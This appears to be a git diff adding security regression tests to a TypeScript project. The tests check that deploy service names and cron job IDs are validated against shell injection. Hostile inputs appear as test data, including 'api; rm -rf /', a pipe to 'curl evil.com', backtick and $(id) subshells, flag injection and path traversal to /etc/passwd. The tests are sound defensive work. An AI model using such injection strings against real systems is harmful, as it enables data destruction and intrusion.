@@ -26,9 +26,11 @@ import {
   validateAgentName,
   validateScheduleValue,
   validateCronId,
+  validateDeployService,
   shellQuote,
 } from '../src/validate.js';
 import { handleCronCreate, handleCronDelete, handleCronHistory } from '../src/tools/cron-manage.js';
+import { handleCronRun } from '../src/tools/cron.js';
 import type { Config } from '../src/config.js';
 
 // Minimal config stub for heuristic-only tests (no SSH/HTTP needed)
@@ -787,6 +789,170 @@ describe('handleCronDelete ID validation (security)', () => {
       assert.ok(
         !(result.error ?? '').includes('Invalid cron job ID'),
         'error should be SSH-level, not UUID validation',
+      );
+    }
+  });
+});
+
+// ============================================================================
+// Security regression: validateDeployService (wave 3 finding 1)
+// ============================================================================
+
+describe('validateDeployService (security)', () => {
+  // Valid inputs
+  it('accepts a plain lowercase service name', () => {
+    assert.equal(validateDeployService('api'), 'api');
+  });
+  it('accepts a name with hyphens and underscores', () => {
+    assert.equal(validateDeployService('my-worker_v2'), 'my-worker_v2');
+  });
+  it('accepts an uppercase service name', () => {
+    assert.equal(validateDeployService('Frontend'), 'Frontend');
+  });
+
+  // Injection attempts that must be rejected
+  it('rejects semicolon injection (wave 3 finding 1)', () => {
+    assert.throws(() => validateDeployService('api; rm -rf /'), /Invalid deploy service name/);
+  });
+  it('rejects backtick injection', () => {
+    assert.throws(() => validateDeployService('api`id`'), /Invalid deploy service name/);
+  });
+  it('rejects dollar-sign subshell', () => {
+    assert.throws(() => validateDeployService('api$(id)'), /Invalid deploy service name/);
+  });
+  it('rejects leading hyphen (flag injection)', () => {
+    assert.throws(() => validateDeployService('-x'), /Invalid deploy service name/);
+  });
+  it('rejects path traversal via dots and slash', () => {
+    assert.throws(() => validateDeployService('../../../etc/passwd'), /Invalid deploy service name/);
+  });
+  it('rejects path traversal via ".."', () => {
+    assert.throws(() => validateDeployService('a/../b'), /Invalid deploy service name/);
+  });
+  it('rejects forward slash', () => {
+    assert.throws(() => validateDeployService('a/b'), /Invalid deploy service name/);
+  });
+  it('rejects space in name', () => {
+    assert.throws(() => validateDeployService('api worker'), /Invalid deploy service name/);
+  });
+  it('rejects pipe injection', () => {
+    assert.throws(() => validateDeployService('api | curl evil.com'), /Invalid deploy service name/);
+  });
+  it('rejects empty string', () => {
+    assert.throws(() => validateDeployService(''), /must not be empty/);
+  });
+  it('rejects name longer than 64 chars', () => {
+    assert.throws(() => validateDeployService('a'.repeat(65)), /too long/);
+  });
+});
+
+// ============================================================================
+// Security regression: handleOpenclawDeploy rejects injection in service name
+// (wave 3 finding 1)
+// ============================================================================
+
+describe('handleOpenclawDeploy injection guard (security)', () => {
+  it('rejects a service with semicolon injection', async () => {
+    const result = await handleOpenclawDeploy(
+      { service: 'api; rm -rf /', action: 'deploy' },
+      { ...stubConfig, sshHost: '0.0.0.1' },
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid deploy service name/);
+  });
+
+  it('rejects a service with path traversal', async () => {
+    const result = await handleOpenclawDeploy(
+      { service: '../../etc/passwd', action: 'rollback' },
+      { ...stubConfig, sshHost: '0.0.0.1' },
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid deploy service name/);
+  });
+
+  it('rejects a service with leading hyphen', async () => {
+    const result = await handleOpenclawDeploy(
+      { service: '-xvf /etc', action: 'status' },
+      { ...stubConfig, sshHost: '0.0.0.1' },
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid deploy service name/);
+  });
+
+  it('accepts a valid service name (falls through to SSH error)', async () => {
+    const result = await handleOpenclawDeploy(
+      { service: 'api', action: 'status' },
+      { ...stubConfig, sshHost: '0.0.0.1' },
+    );
+    // SSH to 0.0.0.1 will fail; validation must not block this.
+    assert.ok(
+      !(result.error ?? '').includes('Invalid deploy service name'),
+      'error should be SSH-level, not service name validation',
+    );
+  });
+});
+
+// ============================================================================
+// Security regression: handleCronRun rejects injection in job_id
+// (wave 3 finding 2)
+// ============================================================================
+
+describe('handleCronRun injection guard (security)', () => {
+  const cronConfig: Config = {
+    ...stubConfig,
+    sshHost: '0.0.0.1',
+    haUrl: 'http://localhost',
+  };
+
+  it('rejects a job_id with semicolon injection', async () => {
+    const result = await handleCronRun(
+      { job_id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890; rm -rf /' },
+      cronConfig,
+    );
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid cron job ID/);
+  });
+
+  it('rejects a non-UUID job_id string', async () => {
+    const result = await handleCronRun({ job_id: 'not-a-uuid' }, cronConfig);
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid cron job ID/);
+  });
+
+  it('rejects a job_id with leading hyphen', async () => {
+    const result = await handleCronRun({ job_id: '-f /etc/cron.d/evil' }, cronConfig);
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /Invalid cron job ID/);
+  });
+
+  it('rejects an empty job_id', async () => {
+    const result = await handleCronRun({ job_id: '' }, cronConfig);
+    assert.equal(result.success, false);
+    assert.match(result.error ?? '', /must not be empty/);
+  });
+
+  it('accepts a valid UUID (falls through to SSH error, does not throw UUID validation)', async () => {
+    // A well-formed UUID must pass validation. SSH to 0.0.0.1 is unreachable so
+    // the handler may either return {success:false} or throw an SSH-level error.
+    // Either outcome is acceptable; the important thing is that the error is NOT
+    // a UUID validation rejection.
+    try {
+      const result = await handleCronRun(
+        { job_id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890' },
+        cronConfig,
+      );
+      if (!result.success) {
+        assert.ok(
+          !(result.error ?? '').includes('Invalid cron job ID'),
+          'error should be SSH-level, not UUID validation',
+        );
+      }
+    } catch (err) {
+      // SSH-level throw is acceptable; UUID validation must not have fired.
+      const msg = err instanceof Error ? err.message : String(err);
+      assert.ok(
+        !msg.includes('Invalid cron job ID'),
+        'thrown error should be SSH-level, not UUID validation',
       );
     }
   });
